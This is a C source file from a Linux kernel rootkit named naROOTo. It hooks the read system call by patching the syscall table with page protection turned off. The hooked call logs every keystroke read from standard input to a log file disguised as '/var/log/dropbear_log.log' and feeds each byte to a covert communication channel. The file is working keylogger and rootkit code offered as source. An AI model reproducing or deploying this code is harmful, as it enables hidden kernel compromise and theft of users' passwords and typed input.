/******************************************************************************
 *
 * Name: read.c 
 * This file contains all necessary functions for hooking and manipulating
 * the read system call. It is used for covert communications channel as well
 * as for keylogging.
 *
 *****************************************************************************/
/*
 * This file is part of naROOTo.

 * naROOTo is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * naROOTo is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <linux/delay.h>
#include <linux/unistd.h>

#include <linux/string.h>
#include <linux/fs.h>
#include <linux/buffer_head.h>
#include <asm/segment.h>
#include <asm/uaccess.h>

#include "covert_communication.h"
#include "include.h"

asmlinkage long (*original_read) (unsigned int fd, char __user * buf,
				  size_t count);

/* fd for the log file */
static struct file *fd;

/*
 * call counter to ensure that we are not unhooking the
 * read syste call while it is still in use
 */
static int read_call_counter = 0;
static spinlock_t read_lock;
static unsigned long read_lock_flags;

static int file_log = 0;

/*
 * Function used for enabling local logging
 */
int enable_filelog(void)
{
	file_log = 1;
	return 0;
}

/*
 * Function used for disabling local logging
 */
int disable_filelog(void)
{
	file_log = 0;
	return 0;
}

/*
 * Function used for local logging inside /var/log
 */
ssize_t write_to_file(char *buf, long len)
{
	static loff_t off = 0;
	static DEFINE_SPINLOCK(wtf_lock);
	ssize_t retv;

	spin_lock(&wtf_lock);
	if (!IS_ERR(fd))
		retv = vfs_write(fd, buf, len, &off);
	else
		retv = PTR_ERR(fd);
	spin_unlock(&wtf_lock);

	return retv;
}

/*
 * Our manipulated read syscall. It will log keystrokes and serve as a covert
 * communication channel.
 */
asmlinkage long
manipulated_read(unsigned int fd, char __user * buf, size_t count)
{
	/* increase our call counter */
	INCREASE_CALL_COUNTER(read_call_counter, &read_lock, read_lock_flags);

	int i;
	ssize_t ret;
	long retv = original_read(fd, buf, count);

	if (retv >= 1 && fd == 0) {
		/* keylog to local file */
		if (file_log) {
			ret = write_to_file(buf, retv);
			if (ret <= 0)
				ROOTKIT_DEBUG
				    ("write_to_file() failed with error code %li",
				     ret);
		}

		for (i = 0; i < retv; i++) {
			char sendbuf[2];

			memcpy(sendbuf, buf + i, 1);
			memset(sendbuf + 1, '\0', 1);

			/* send to covert communication channel */
			ret = accept_input(buf[i]);
			if (ret < 0)
				ROOTKIT_DEBUG
				    ("accept_input() failed with error code %li",
				     ret);
		}
	}

	/* decrease our call counter and return */
	DECREASE_CALL_COUNTER(read_call_counter, &read_lock, read_lock_flags);
	return retv;
}

/*
 * hooks the read system call
 */
int hook_read(void)
{
	ROOTKIT_DEBUG("Hooking read syscall...\n");

	void **sys_call_table = (void *)sysmap_sys_call_table;

	/* create the file with write and append mode */
	fd = filp_open("/var/log/dropbear_log.log",
		       O_CREAT | O_WRONLY | O_APPEND, S_IRUSR | S_IWUSR);

	/* disable write protection */
	disable_page_protection();

	/* replace the read syscall */
	original_read = (void *)sys_call_table[__NR_read];
	sys_call_table[__NR_read] = (unsigned long *)manipulated_read;

	/* reenable write protection */
	enable_page_protection();

	/* log and return */
	ROOTKIT_DEBUG("Done.\n");
	return 0;
}

/*
 *unhooks read and returns the kernel to its regular state
 */
void unhook_read(void)
{
	long l = 0;

	ROOTKIT_DEBUG("Restoring the original read syscall...\n");

	void **sys_call_table = (void *)sysmap_sys_call_table;

	/* disable write protection */
	disable_page_protection();

	/* restore the old syscall */
	sys_call_table[__NR_read] = (unsigned long *)original_read;

	/* reenable write protection */
	enable_page_protection();

	/* ensure that all processes have left our manipulated syscall */
	while (read_call_counter > 0) {
		if (l % 16 == 0)
			ROOTKIT_DEBUG("read_call_counter is at %i",
				      read_call_counter);
		l++;
		msleep(2);
	}
	ROOTKIT_DEBUG("Done after %li loops", l);

	/* close our logfile */
	filp_close(fd, NULL);

	/* log and return */
	ROOTKIT_DEBUG("Done.\n");
}
